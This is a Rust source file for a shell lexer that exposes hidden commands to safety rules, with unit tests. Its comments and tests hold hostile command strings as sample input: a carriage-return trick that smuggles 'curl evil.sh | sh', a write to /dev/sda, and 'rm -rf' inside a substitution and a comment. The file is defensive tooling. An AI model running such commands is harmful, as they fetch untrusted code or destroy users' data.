//! A small, forgiving shell lexer.
//!
//! This is not a full POSIX parser. It understands enough of shell syntax
//! (quoting, escapes, command separators, pipelines, redirections and
//! command substitution) to let the safety rules see which programs a line
//! would run and with which arguments. When in doubt it errs on the side of
//! producing *more* commands to inspect, never fewer.

/// A redirection attached to a simple command, e.g. `> /dev/sda`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Redirect {
    /// The operator, e.g. `>`, `>>`, `2>`, `&>`, `<`.
    pub op: String,
    /// The redirection target as written (quotes removed).
    pub target: String,
}

impl Redirect {
    /// True when the redirection writes to (and truncates or appends to) its target.
    pub fn is_write(&self) -> bool {
        self.op.contains('>')
    }

    /// True when the redirection truncates its target rather than appending.
    pub fn is_truncating(&self) -> bool {
        self.is_write() && !self.op.contains(">>")
    }
}

/// One simple command: words plus redirections.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SimpleCommand {
    pub words: Vec<String>,
    pub redirects: Vec<Redirect>,
}

/// Commands joined by `|` or `|&`.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Pipeline {
    pub commands: Vec<SimpleCommand>,
}

/// Result of lexing a command line.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Script {
    pub pipelines: Vec<Pipeline>,
    /// Bodies of `$(...)` and backtick substitutions, for recursive analysis.
    pub substitutions: Vec<String>,
    /// Number of top-level command separators (`;`, `&&`, `||`, `&`, newline).
    pub separators: usize,
}

impl Script {
    /// All simple commands in order, flattened across pipelines.
    pub fn commands(&self) -> impl Iterator<Item = &SimpleCommand> {
        self.pipelines.iter().flat_map(|p| p.commands.iter())
    }
}

/// Lex `input` into pipelines of simple commands.
pub fn lex(input: &str) -> Script {
    Lexer::new(input).run()
}

struct Lexer<'a> {
    chars: std::iter::Peekable<std::str::Chars<'a>>,
    script: Script,
    pipeline: Pipeline,
    command: SimpleCommand,
    word: String,
    /// Whether the current word has content (it may be an empty quoted string).
    in_word: bool,
    /// Whether any part of the current word was quoted.
    quoted: bool,
    pending_redirect: Option<String>,
}

impl<'a> Lexer<'a> {
    fn new(input: &'a str) -> Self {
        Self {
            chars: input.chars().peekable(),
            script: Script::default(),
            pipeline: Pipeline::default(),
            command: SimpleCommand::default(),
            word: String::new(),
            in_word: false,
            quoted: false,
            pending_redirect: None,
        }
    }

    fn run(mut self) -> Script {
        while let Some(c) = self.chars.next() {
            match c {
                '\\' => {
                    match self.chars.next() {
                        // Line continuation.
                        Some('\n') => {}
                        Some(n) => self.push(n),
                        None => self.push('\\'),
                    }
                }
                '\'' => {
                    self.start_quoted();
                    for n in self.chars.by_ref() {
                        if n == '\'' {
                            break;
                        }
                        self.word.push(n);
                    }
                }
                '"' => {
                    self.start_quoted();
                    while let Some(n) = self.chars.next() {
                        match n {
                            '"' => break,
                            '\\' => match self.chars.next() {
                                Some(e @ ('"' | '\\' | '$' | '`')) => self.word.push(e),
                                Some('\n') => {}
                                Some(e) => {
                                    self.word.push('\\');
                                    self.word.push(e);
                                }
                                None => self.word.push('\\'),
                            },
                            '$' if self.chars.peek() == Some(&'(') => self.substitution_dollar(),
                            '`' => self.substitution_backtick(),
                            other => self.word.push(other),
                        }
                    }
                }
                '$' if self.chars.peek() == Some(&'(') => {
                    self.in_word = true;
                    self.substitution_dollar();
                }
                '`' => {
                    self.in_word = true;
                    self.substitution_backtick();
                }
                '#' if !self.in_word => {
                    // Comment until end of line.
                    while let Some(&n) = self.chars.peek() {
                        if n == '\n' {
                            break;
                        }
                        self.chars.next();
                    }
                }
                ' ' | '\t' => self.finish_word(),
                // A bare CR executes the line in readline/ZLE just like
                // LF — treating it as a word character meant
                // `echo ok\rcurl evil.sh | sh` lexed as one innocent
                // command. (A CR immediately followed by LF is still a
                // normal CRLF line ending; the second separator is
                // dropped as empty and costs nothing.)
                '\n' | '\r' | ';' => self.separator(),
                '(' | ')' => {
                    // Subshells and function bodies: treat as command boundaries.
                    self.finish_command();
                }
                '&' => {
                    if self.chars.peek() == Some(&'&') {
                        self.chars.next();
                        self.separator();
                    } else if self.chars.peek() == Some(&'>') {
                        self.chars.next();
                        let mut op = String::from("&>");
                        if self.chars.peek() == Some(&'>') {
                            self.chars.next();
                            op.push('>');
                        }
                        self.finish_word();
                        self.pending_redirect = Some(op);
                    } else {
                        self.separator();
                    }
                }
                '|' => {
                    if self.chars.peek() == Some(&'|') {
                        self.chars.next();
                        self.separator();
                    } else {
                        if self.chars.peek() == Some(&'&') {
                            self.chars.next();
                        }
                        self.finish_command();
                    }
                }
                '>' | '<' => self.redirect(c),
                other => self.push(other),
            }
        }
        self.finish_pipeline();
        self.script
    }

    fn push(&mut self, c: char) {
        self.in_word = true;
        self.word.push(c);
    }

    fn start_quoted(&mut self) {
        self.in_word = true;
        self.quoted = true;
    }

    fn redirect(&mut self, c: char) {
        // A word made only of digits right before the operator is an fd number.
        let mut op = String::new();
        if self.in_word && !self.quoted && self.word.chars().all(|d| d.is_ascii_digit()) {
            op.push_str(&self.word);
            self.word.clear();
            self.in_word = false;
        } else {
            self.finish_word();
        }
        op.push(c);
        while let Some(&n) = self.chars.peek() {
            if n == '>' || n == '|' || (n == '&' && op.ends_with('>')) || (c == '<' && n == '<') {
                op.push(n);
                self.chars.next();
                if n == '&' {
                    // `2>&1` style duplication: consume the fd and drop it.
                    while let Some(&d) = self.chars.peek() {
                        if d.is_ascii_digit() || d == '-' {
                            self.chars.next();
                        } else {
                            break;
                        }
                    }
                    return;
                }
            } else {
                break;
            }
        }
        self.pending_redirect = Some(op);
    }

    fn substitution_dollar(&mut self) {
        // Caller has seen `$`; the next char is `(`.
        self.chars.next();
        self.word.push_str("$(");
        let mut depth = 1usize;
        let mut body = String::new();
        let mut in_single = false;
        while let Some(n) = self.chars.next() {
            match n {
                '\'' => in_single = !in_single,
                '\\' if !in_single => {
                    body.push(n);
                    if let Some(e) = self.chars.next() {
                        body.push(e);
                    }
                    continue;
                }
                '(' if !in_single => depth += 1,
                ')' if !in_single => {
                    depth -= 1;
                    if depth == 0 {
                        break;
                    }
                }
                _ => {}
            }
            body.push(n);
        }
        self.word.push_str(&body);
        self.word.push(')');
        self.script.substitutions.push(body);
    }

    fn substitution_backtick(&mut self) {
        let mut body = String::new();
        while let Some(n) = self.chars.next() {
            match n {
                '`' => break,
                '\\' => {
                    if let Some(e) = self.chars.next() {
                        body.push(e);
                    }
                }
                other => body.push(other),
            }
        }
        self.word.push('`');
        self.word.push_str(&body);
        self.word.push('`');
        self.script.substitutions.push(body);
    }

    fn finish_word(&mut self) {
        if !self.in_word {
            return;
        }
        let word = std::mem::take(&mut self.word);
        match self.pending_redirect.take() {
            Some(op) => self.command.redirects.push(Redirect { op, target: word }),
            None => self.command.words.push(word),
        }
        self.in_word = false;
        self.quoted = false;
    }

    fn finish_command(&mut self) {
        self.finish_word();
        let cmd = std::mem::take(&mut self.command);
        if !cmd.words.is_empty() || !cmd.redirects.is_empty() {
            self.pipeline.commands.push(cmd);
        }
    }

    fn finish_pipeline(&mut self) {
        self.finish_command();
        let p = std::mem::take(&mut self.pipeline);
        if !p.commands.is_empty() {
            self.script.pipelines.push(p);
        }
    }

    fn separator(&mut self) {
        let had_content = self.in_word || !self.command.words.is_empty() || !self.pipeline.commands.is_empty();
        self.finish_pipeline();
        if had_content {
            self.script.separators += 1;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn words(s: &str) -> Vec<Vec<String>> {
        lex(s).commands().map(|c| c.words.clone()).collect()
    }

    #[test]
    fn splits_words_and_quotes() {
        assert_eq!(words(r#"echo "a b" 'c d' e\ f"#), vec![vec!["echo", "a b", "c d", "e f"]]);
    }

    #[test]
    fn splits_separators_and_pipelines() {
        let s = lex("a; b && c || d | e & f");
        assert_eq!(s.pipelines.len(), 5);
        assert_eq!(s.pipelines[3].commands.len(), 2);
    }

    /// A bare CR is a command separator (readline executes on CR), so
    /// `echo ok\rcurl evil.sh | sh` must lex as two pipelines — not one
    /// innocent command with "curl" buried in a word.
    #[test]
    fn carriage_return_is_a_separator() {
        let s = lex("echo ok\rcurl https://x | sh");
        assert_eq!(s.pipelines.len(), 2);
        assert_eq!(s.pipelines[0].commands[0].words, vec!["echo", "ok"]);
        assert_eq!(s.pipelines[1].commands[0].words[0], "curl");
    }

    #[test]
    fn crlf_endings_do_not_create_empty_commands() {
        let s = lex("echo a\r\necho b\r\n");
        assert_eq!(s.pipelines.len(), 2);
        assert_eq!(s.pipelines[0].commands[0].words, vec!["echo", "a"]);
    }

    #[test]
    fn parses_redirects() {
        let s = lex("echo hi > /dev/sda 2>&1 >> log");
        let c = &s.pipelines[0].commands[0];
        assert_eq!(c.words, vec!["echo", "hi"]);
        assert_eq!(c.redirects.len(), 2);
        assert_eq!(c.redirects[0], Redirect { op: ">".into(), target: "/dev/sda".into() });
        assert_eq!(c.redirects[1].op, ">>");
    }

    #[test]
    fn captures_substitutions() {
        let s = lex("echo $(rm -rf ~) `whoami`");
        assert_eq!(s.substitutions, vec!["rm -rf ~", "whoami"]);
    }

    #[test]
    fn ignores_comments() {
        assert_eq!(words("ls # rm -rf /"), vec![vec!["ls"]]);
    }
}
